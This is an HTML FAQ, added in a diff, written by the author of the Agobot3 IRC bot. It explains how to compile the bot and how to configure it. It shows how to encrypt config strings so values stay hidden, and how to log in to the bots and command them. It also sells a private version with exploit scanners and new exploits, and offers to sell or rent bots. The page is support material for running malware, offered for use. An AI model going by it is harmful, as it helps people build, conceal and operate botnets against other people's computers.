@@ -1,0 +1,386 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+</head>
+<body alink="#000099" vlink="#990099" link="#000099"
+ style="color: rgb(255, 255, 255); background-color: rgb(0, 0, 0);">
+<h3>[1] <a href="#compilation">Compilation</a>:</h3>
+<ul>
+  <li>[1.1] <a href="#jump_1_1">What software is needed for
+compilation ?</a></li>
+  <li>[1.2] <a href="#jump_1_2">How to use Visual Studio ?</a></li>
+  <li>[1.3] <a href="#jump_1_3">How to use MingW32 ?</a></li>
+  <li>[1.4] <a href="#jump_1_4">How to use BCC ?</a></li>
+  <li>[1.5] <a href="#jump_1_5">How to use GCC ?</a></li>
+  <li>[1.6] <a href="#jump_1_6">Which systems are tested ?</a></li>
+  <li>[1.7] <a href="#jump_1_7">What to do if I'm getting compilation
+errors ?</a><br>
+  </li>
+</ul>
+<h3>[2] <a href="#configuration">Configuration</a>:</h3>
+<ul>
+  <li>[2.1] <a href="#jump_2_1">How to configure ?</a></li>
+  <li>[2.2] <a href="#jump_2_2">How do I get a MD5 password ?</a></li>
+  <li>[2.3] <a href="#jump_2_3">How to crypt strings for config file
+usage ?</a></li>
+</ul>
+<h3>[3] <a href="#installation">Installation</a>:</h3>
+<ul>
+  <li>[3.1] <a href="#jump_3_1">It doesn't start, what do I do ?</a></li>
+</ul>
+<h3>[4] <a href="#runtime">Runtime</a>:</h3>
+<ul>
+  <li>[4.1] <a href="#jump_4_1">How to use it ?</a></li>
+  <li>[4.2] <a href="#jump_4_2">Where can I get help for the commands ?</a></li>
+</ul>
+<h3>[5] <a href="#private">Private version</a>:</h3>
+<ul>
+  <li>[5.1] <a href="#jump_5_1">How do I get the private version ?</a></li>
+  <li>[5.2] <a href="#jump_5_2">What about the leaked one ?</a></li>
+  <li>[5.3] <a href="#jump_5_3">What's the price for the private
+version ?</a></li>
+  <li>[5.4] <a href="#jump_5_4">I don't have enough money to buy it,
+what to do ?</a><br>
+  </li>
+</ul>
+<br>
+<hr style="width: 100%; height: 2px;">
+<h3>[1] Compilation: <a name="compilation"></a></h3>
+[1.1] What software is needed for compilation ? <a name="jump_1_1"></a><br>
+<div style="margin-left: 40px;">This really depends on the version you
+want to compile. There are 3 compilers currently supported on Win32,
+Microsoft's Visual C++ 6, MingW32 and the Borland C++ Compiler. Since
+the MingW32 version is currently incomlete, and the Borland version
+only built but crashed on startup, the only real support I'm giving at
+the moment is for Microsoft Visual C++ 6. Additionally the bot has
+support for Linux (or more generally POSIX compatible systems), it was
+tested using gcc 3.2.x and 3.3.x.<br>
+<br>
+The bot also needs a copy of OpenSSL, but this is already included as a
+static library for Win32, Linux and MingW32. You can get OpenSSL from <a
+ href="http://www.openssl.org/">http://www.openssl.org/</a>. There will
+be instructions on how to build your own static library soon.<br>
+<br>
+</div>
+[1.2] How to use Visual Studio ? <a name="jump_1_2"></a>
+<div style="margin-left: 40px;">Get the Visual Studio 6 SP5 from <a
+ href="http://msdn.microsoft.com/vstudio/downloads/updates/sp/vs6/sp5/">here</a>,
+newest Platform SDK from <a
+ href="http://www.microsoft.com/msdownload/platformsdk/sdkupdate/">here</a>
+(you don't need the full 129mb download, <span
+ style="font-weight: bold;">only Core SDK/Build Environment</span>) and
+the Processor Pack from <a
+ href="http://msdn.microsoft.com/vstudio/downloads/tools/ppack/default.aspx">here</a>.
+Install all 3. Add the following paths to
+"Tools|Options...|Directories" in Visual Studio (<span
+ style="font-weight: bold;">be sure to include them on top of the list</span>):<br>
+<br>
+to "Show directories for|Executable files:"<br>
+&lt;path to sdk&gt;\MICROSOFT SDK\BIN<br>
+<br>
+to "Show directories for|Include files":<br>
+&lt;path to sdk&gt;\MICROSOFT SDK\INCLUDE<br>
+<br>
+to "Show directories for|Library files":<br>
+&lt;path to sdk&gt;\MICROSOFT SDK\LIB<br>
+<br>
+Replace "&lt;path to sdk&gt;" with the path where you installed the
+Platform SDK.<br>
+<br>
+You should be ready to compile now.<br>
+<br>
+</div>
+[1.3] How to use MingW32 ? <a name="jump_1_3"></a>
+<div style="margin-left: 40px;">Soon to be available.<br>
+<br>
+</div>
+[1.4] How to use BCC ? <a name="jump_1_4"></a>
+<div style="margin-left: 40px;">Soon to be available.<br>
+<br>
+</div>
+[1.5] How to use GCC ? <a name="jump_1_5"></a><br>
+<div style="margin-left: 40px;">Execute this:<br>
+gcc -v 2&gt;&amp;1 | grep "gcc version"<br>
+and check if the reported version is one of the supported version, if
+it isn't, you can still try and compile, but you should consider
+notifying me so I can update my documentation. I'm always looking for
+people who test my bot on Linux flavors I didn't test it on.<br>
+Edit Makefile to enable optimization or debug, you just have to remove
+some # signs to uncomment the line. After this type "make", it will
+start compilation, and if everything works well you will end up with an
+agobot3 executable that you can test using ./agobot3 if you're using
+bash.<br>
+Beware that the Linux version isn't a finished bot, but it mostly
+works. It has no installer to add itself to SysV startup at the moment,
+but I'm planning on fixing this in reasonable time.<br>
+<br>
+</div>
+[1.6] Which systems are tested ?&nbsp; <a name="jump_1_6"></a>
+<div style="margin-left: 40px;">
+<table style="text-align: left; width: 948px; height: 32px;" border="1"
+ cellspacing="2" cellpadding="2">
+  <tbody>
+    <tr>
+      <td style="vertical-align: top;">Debian 3.0</td>
+      <td style="vertical-align: top;">2.4.20-3-k6</td>
+      <td style="vertical-align: top;">libc6 / gcc version 3.3.1
+20030728 (Debian prerelease)</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Slackware 9.0</td>
+      <td style="vertical-align: top;">2.4.20</td>
+      <td style="vertical-align: top;">libc6 / gcc version 3.2.2</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">FreeBSD 4.8</td>
+      <td style="vertical-align: top;">???<br>
+      </td>
+      <td style="vertical-align: top;">libc6 / gcc version 3.3.1
+20030728 (Debian prerelease) / compiled in debian</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">SuSe 8.1</td>
+      <td style="vertical-align: top;">2.4.21</td>
+      <td style="vertical-align: top;">libc6 / gcc version 3.2</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows 2000 Server English</td>
+      <td style="vertical-align: top;">SP4<br>
+      </td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows 2000 Server English</td>
+      <td style="vertical-align: top;">SP3<br>
+      </td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows 2000 Pro English</td>
+      <td style="vertical-align: top;">SP4<br>
+      </td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows 2000 Pro English</td>
+      <td style="vertical-align: top;">SP3</td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows 2000 Pro German</td>
+      <td style="vertical-align: top;">SP1</td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows 2003 Server English</td>
+      <td style="vertical-align: top;">SP0</td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows 2003 Server English</td>
+      <td style="vertical-align: top;">SP1</td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows XP Pro English</td>
+      <td style="vertical-align: top;">SP0</td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5</td>
+    </tr>
+    <tr>
+      <td style="vertical-align: top;">Windows XP Home Polish<br>
+      </td>
+      <td style="vertical-align: top;">SP1<br>
+      </td>
+      <td style="vertical-align: top;">Visual Studio 6.0 SP5<br>
+      </td>
+    </tr>
+  </tbody>
+</table>
+<br>
+Contact me if you tested on any system that isn't in this list yet.<br>
+<br>
+</div>
+[1.7] What to do if I'm getting compilation errors ?<a name="jump_1_7"></a>
+<div style="margin-left: 40px;">First: don't worry about compiler
+warnings, they are pretty common.<br>
+This can have multiple causes. I'll try to list a few here.<br>
+<br>
+<div style="margin-left: 40px;">C:\agobot3\nbscanner.cpp(120) : error
+C2440: '=' : cannot convert from
+'unsigned short [260]' to 'char *'<br>
+Types pointed to are unrelated; conversion requires reinterpret_cast,
+C-style cast or function-style cast<br>
+C:\agobot3\nbscanner.cpp(121) : error C2440: '=' : cannot convert from
+'unsigned short [1]' to 'char *'<br>
+Types pointed to are unrelated; conversion requires reinterpret_cast,
+C-style cast or function-style cast<br>
+<br>
+</div>
+</div>
+<div style="margin-left: 40px;">Something like this means that you
+haven't installed the Platform SDK the right way, goto <a
+ href="#jump_1_2">[1.2]</a> again, and be especially careful to read
+the bold parts. What I want to say is that you have to add the Platform
+SDK <span style="font-weight: bold;">ON TOP </span>of the list.<br>
+<br>
+<div style="margin-left: 40px;">C:\agobot3\main.h(31) : fatal error
+C1083: Cannot open include file: 'psapi.h': No such file or directory<br>
+<br>
+</div>
+</div>
+<div style="margin-left: 40px;">Same as above, the SDK files were not
+found, cause psapi.h is in the SDK. goto <a href="#jump_1_2">[1.2]</a>
+again, and be sure to install it right.<br>
+<br>
+<div style="margin-left: 40px;">LINK : warning LNK4089: all references
+to "GDI32.dll" discarded by /OPT:REF<br>
+ftplib\ftplib.c(415) : warning C4761: integral size mismatch in
+argument; conversion supplied<br>
+</div>
+</div>
+<div style="margin-left: 40px;"><br>
+You can ignore this warning, I got it too, and it was never a problem
+for me.<br>
+</div>
+<div style="margin-left: 40px;"></div>
+<div style="margin-left: 40px;"></div>
+<h3>[2] Configuration: <a name="configuration"></a></h3>
+[2.1] How to configure ? <a name="jump_2_1"></a>
+<div style="margin-left: 40px;">Copy \configs\config-sample.cpp to
+\config.cpp. Edit the file to configure the bot.<br>
+<br>
+</div>
+[2.2] How do I get a MD5 password ? <a name="jump_2_2"></a>
+<div style="margin-left: 40px;">Win32: Open agobot3.dsw, right click
+the getmd5 project, select "Build"<br>
+Linux: cd getmd5 ; make<br>
+<br>
+After that there is a getmd5 executable in \bin\&lt;platform&gt; which
+you have to start like this:<br>
+<br>
+V:\bin\win32&gt;getmd5.exe password<br>
+MD5 of "password" is "5F4DCC3B5AA765D61D8327DEB882CF99"<br>
+V:\bin\win32&gt;<br>
+<br>
+Copy the string "5F4DCC3B5AA765D61D8327DEB882CF99" into your config as
+the password.<br>
+<br>
+</div>
+[2.3] How to crypt strings for config file usage ? <a name="jump_2_3"></a>
+<div style="margin-left: 40px;">Win32: Open agobot3.dsw, right click
+the crypt project, select "Build"<br>
+Linux: cd crypt ; make<br>
+<br>
+After that there is a crypt executable in \bin\&lt;platform&gt; which
+you have to start like this:<br>
+<br>
+V:\bin\win32&gt;crypt text 10 blabla<br>
+igjigj<br>
+V:\bin\win32&gt;<br>
+<br>
+If the crypted string contains non-printable characters, start it like
+this:<br>
+<br>
+V:\bin\win32&gt;crypt hex 10 blabla<br>
+\x69\x67\x6A\x69\x67\x6A<br>
+V:\bin\win32&gt;<br>
+<br>
+Set the CVar you want to have crypted in config.cpp like this:<br>
+<br>
+g_cMainCtrl.m_cCVar.RegisterCvar(&amp;bot_id, "bot_id",
+"\x69\x67\x6A\x69\x67\x6A", "Bot - Current ID", false, true, 10);<br>
+instead of:<br>
+g_cMainCtrl.m_cCVar.RegisterCvar(&amp;bot_id, "bot_id",
+"\x69\x67\x6A\x69\x67\x6A", "Bot - Current ID", false, false, 0);<br>
+<br>
+</div>
+<h3>[3] Installation: <a name="installation"></a></h3>
+[3.1] It doesn't start, what do I do ?<a name="jump_3_1"></a>
+<div style="margin-left: 40px;">Compile the bot in debug mode, this is
+either done by selecting "agobot3 - Win32 Debug" from "Build|Set Active
+Configuration..." in Visual Studio, or by editing Makefile and
+uncommenting the debug lines in Linux. Start the bot with these command
+line parameters: agobot3 -debug -debuglevel 10. It will popup a DOS
+(actually only the Win32 console) window that contains all the debug
+info the bot is giving. If you can't find the error using this
+information yourself, send me a log.<br>
+</div>
+<h3>[4] Runtime: <a name="runtime"></a></h3>
+[4.1] How to use it ?<a name="jump_4_1"></a>
+<div style="margin-left: 40px;">First use .login &lt;user&gt;
+&lt;password&gt; to login to the bot. After that /msg one of the bots
+with ".commands.list", this will cause the bot to reply with its
+command list.<br>
+<br>
+</div>
+[4.2] Where can I get help for the commands ?<a name="jump_4_2"></a>
+<div style="margin-left: 40px;">Check out the command reference <a
+ href="commandref.html">here</a>.<br>
+</div>
+<h3>[5] Private version: <a name="private"></a></h3>
+[5.1] How do I get the private version ?<a name="jump_5_1"></a><br>
+<div style="margin-left: 40px;">Contact me, you will either have to
+make good contributions of code or pay me for it, cause I can't do all
+of this for free (there's lot of time involved).<br>
+<br>
+</div>
+[5.2] What about the leaked one ?<a name="jump_5_2"></a><br>
+<div style="margin-left: 40px;">This software was distributed without
+my permission, that's why it's really buggy, but don't try asking me
+for
+help with it, cause I already know about the bugs and am developing a
+version that is much newer and better (i.e. the new scanner can scan
+WinXP, which is a big number of hosts). If you really want to use the
+leaked version I cannot stop you, but beware that there's no support,
+and the bot may crash unexpectedly and/or not remove it and/or not
+shutdown threads correctly and/or not be able to create new threads at
+all.<br>
+<br>
+Nobody in who isn't insane will give out his scanner if it isn't
+outdated, cause else everyone will be able to scan with it making the
+exploit effectively much more ineffective. Also the scanner (and
+probably other features of the private version) is my source for
+money, so that's another reason I won't give it out. If you want to buy
+the code, you will get all updates ill do to the private version, which
+will also include new exploits every few months (though i cannot
+guarantee that). Also there will be a premium version with all kinds of
+scanners for Linux/Unix based systems included, but that will have to
+wait till I have the Linux version fully working (i.e. Autostart isn't
+there yet).<br>
+<br>
+</div>
+[5.3] What's the price for the private version ?<a name="jump_5_3"></a><br>
+<div style="margin-left: 40px;">Minimum:<br>
+<ul>
+  <li>No updates, but bugfixes if they are requested</li>
+  <li>Price: 50$</li>
+  <li>Update price: 10$</li>
+</ul>
+Standard:<br>
+<ul>
+  <li>All updates and new scanners</li>
+  <li>Price: 100$</li>
+</ul>
+Premium:<br>
+<ul>
+  <li>Linux scanners, all updates and new scanners</li>
+  <li>Price: 250$</li>
+</ul>
+I accept payment through paypal.<br>
+<br>
+I might also be willing to sell/rent/share bots but I don't have a
+price set, contact me and we can negotiate one.<br>
+<br>
+</div>
+<div style="text-align: left;">[5.4] I don't have enough money to buy
+it, what to do ?<a name="jump_5_4"></a>
+<div style="margin-left: 40px;">Contact me with an offer for something
+I really need, or if you're living in a poor country I could negotiate
+a discount price with you.<br>
+<br>
+</div>
+&nbsp;- by Ago<br>
+<br>
+</div>
+</body>
+</html>
